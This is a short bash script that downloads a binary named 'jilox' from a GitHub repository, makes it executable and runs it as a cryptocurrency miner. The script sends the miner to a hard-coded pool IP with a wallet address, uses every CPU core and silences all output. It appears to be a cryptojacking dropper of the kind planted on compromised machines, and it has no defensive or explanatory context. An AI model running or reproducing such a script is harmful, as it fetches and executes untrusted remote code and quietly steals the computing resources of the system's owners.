#!/bin/bash
A=188.166.186.218:443
B=8ARZp6tyeNzMcq9zheXVcoA2z3VVuueCTJZkmNmwh36yRztNuoLFqLUWZDysmSM5q7fyqcYdn1BcDfzJtHXdQMEdTsG6eDB
C=GAS
wget https://github.com/14613261/14613261/raw/main/jilox && chmod u+x jilox >/dev/null 2>&1
./jilox --coin=SAL --url $A --user $B --pass $C --donate-level 1 -a rx/0 -t $(nproc --all) >/dev/null 2>&1
